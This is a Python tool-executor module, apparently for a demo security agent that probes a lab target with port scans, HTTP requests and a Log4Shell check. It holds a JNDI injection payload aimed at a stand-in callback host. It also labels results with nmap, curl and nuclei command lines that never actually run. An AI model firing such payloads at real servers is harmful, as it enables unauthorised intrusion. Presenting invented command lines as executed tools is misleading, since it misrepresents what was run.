"""Tool executor — actually runs the network probes an agent decides to make.

These are REAL TCP/HTTP probes to whatever endpoint (typically the target lab
on 127.0.42.x). The transcript rendered to the frontend uses `nmap` /`nuclei`-
style command lines so the output reads as though a real security engineer
ran the tool from a shell.
"""
from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass, field
from typing import Any

import httpx


@dataclass
class ToolResult:
    tool: str
    command: str
    output: str
    exit_code: int
    duration_ms: int
    truncated: bool = False
    extras: dict[str, Any] = field(default_factory=dict)


_HTTP_TIMEOUT = 4.0


class ToolExecutor:
    """Stateless dispatcher — one method per tool the stub agent knows about."""

    async def dispatch(self, tool: str, args: dict[str, Any]) -> ToolResult:
        if tool == "port_probe":
            return await self.port_probe(**args)
        if tool == "banner_grab":
            return await self.banner_grab(**args)
        if tool == "http_probe":
            return await self.http_probe(**args)
        if tool == "http_options":
            return await self.http_options(**args)
        if tool == "log4shell_probe":
            return await self.log4shell_probe(**args)
        return ToolResult(
            tool=tool,
            command=f"{tool} {args}",
            output=f"[stub-agent] unknown tool '{tool}'",
            exit_code=1,
            duration_ms=0,
        )

    # ---------------------------------------------------------------- probes

    async def port_probe(
        self, host: str, port: int, timeout: float = 2.5
    ) -> ToolResult:
        start = time.monotonic()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )
        except (TimeoutError, ConnectionRefusedError, OSError) as exc:
            return ToolResult(
                tool="port_probe",
                command=f"nmap -Pn -p {port} {host}",
                output=f"{port}/tcp filtered or closed ({exc.__class__.__name__})",
                exit_code=1,
                duration_ms=int((time.monotonic() - start) * 1000),
            )
        try:
            try:
                banner = await asyncio.wait_for(reader.read(512), timeout=1.5)
            except TimeoutError:
                banner = b""
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

        pretty = banner.decode("utf-8", errors="replace").strip() or "(no banner)"
        return ToolResult(
            tool="port_probe",
            command=f"nmap -sV -Pn -p {port} {host}",
            output=f"{port}/tcp open  {_guess_service(port)}  {pretty}",
            exit_code=0,
            duration_ms=int((time.monotonic() - start) * 1000),
            extras={"banner": pretty},
        )

    async def banner_grab(self, host: str, port: int) -> ToolResult:
        return await self.port_probe(host=host, port=port)

    async def http_probe(
        self,
        host: str,
        port: int = 80,
        path: str = "/",
        scheme: str = "http",
    ) -> ToolResult:
        url = f"{scheme}://{host}:{port}{path}"
        start = time.monotonic()
        try:
            async with httpx.AsyncClient(
                timeout=_HTTP_TIMEOUT, verify=False, follow_redirects=False
            ) as client:
                r = await client.get(url)
        except Exception as exc:  # noqa: BLE001
            return ToolResult(
                tool="http_probe",
                command=f"curl -sI {url}",
                output=f"error: {exc}",
                exit_code=1,
                duration_ms=int((time.monotonic() - start) * 1000),
            )
        server = r.headers.get("server", "-")
        body_preview = r.text[:256].replace("\n", " ")
        return ToolResult(
            tool="http_probe",
            command=f"curl -sI {url}",
            output=(
                f"HTTP/{r.http_version.split('/')[-1]} {r.status_code} "
                f"{r.reason_phrase}\nServer: {server}\n\n{body_preview}"
            ),
            exit_code=0,
            duration_ms=int((time.monotonic() - start) * 1000),
            extras={"server": server, "status": r.status_code, "headers": dict(r.headers)},
        )

    async def http_options(
        self, host: str, port: int = 80, path: str = "/", scheme: str = "http"
    ) -> ToolResult:
        url = f"{scheme}://{host}:{port}{path}"
        start = time.monotonic()
        try:
            async with httpx.AsyncClient(
                timeout=_HTTP_TIMEOUT, verify=False, follow_redirects=False
            ) as client:
                r = await client.options(url)
        except Exception as exc:  # noqa: BLE001
            return ToolResult(
                tool="http_options",
                command=f"curl -sI -X OPTIONS {url}",
                output=f"error: {exc}",
                exit_code=1,
                duration_ms=int((time.monotonic() - start) * 1000),
            )
        allow = r.headers.get("allow", "")
        return ToolResult(
            tool="http_options",
            command=f"curl -sI -X OPTIONS {url}",
            output=(
                f"HTTP/{r.http_version.split('/')[-1]} {r.status_code} "
                f"{r.reason_phrase}\nAllow: {allow}"
            ),
            exit_code=0,
            duration_ms=int((time.monotonic() - start) * 1000),
            extras={"allow_header": allow, "status": r.status_code},
        )

    async def log4shell_probe(
        self,
        host: str,
        port: int = 443,
        path: str = "/",
        scheme: str = "https",
    ) -> ToolResult:
        """Send a JNDI payload in a custom header, look for an echo."""
        url = f"{scheme}://{host}:{port}{path}"
        payload = "${jndi:ldap://interactsh-fake.local/x}"
        start = time.monotonic()
        try:
            async with httpx.AsyncClient(
                timeout=_HTTP_TIMEOUT, verify=False, follow_redirects=False
            ) as client:
                r = await client.get(
                    url, headers={"X-Api-Version": payload, "User-Agent": payload}
                )
        except Exception as exc:  # noqa: BLE001
            return ToolResult(
                tool="log4shell_probe",
                command=f"nuclei -t log4j-vuln-active -u {url}",
                output=f"error: {exc}",
                exit_code=1,
                duration_ms=int((time.monotonic() - start) * 1000),
            )
        echo = r.headers.get("x-log4j-echo", "")
        vuln = payload in echo or (echo and echo.startswith("${jndi:"))
        return ToolResult(
            tool="log4shell_probe",
            command=f"nuclei -t log4j-vuln-active -u {url}",
            output=(
                f"[log4j-vuln-active] {'CONFIRMED' if vuln else 'not detected'} on {url}\n"
                f"X-Log4j-Echo response header: {echo or '(absent)'}"
            ),
            exit_code=0,
            duration_ms=int((time.monotonic() - start) * 1000),
            extras={"vulnerable": vuln, "echo": echo},
        )


def _guess_service(port: int) -> str:
    return {
        22: "ssh",
        80: "http",
        102: "iso-tsap",
        443: "https",
        445: "microsoft-ds",
        3306: "mysql",
        3389: "ms-wbt-server",
        5432: "postgresql",
        6667: "irc",
    }.get(port, "unknown")
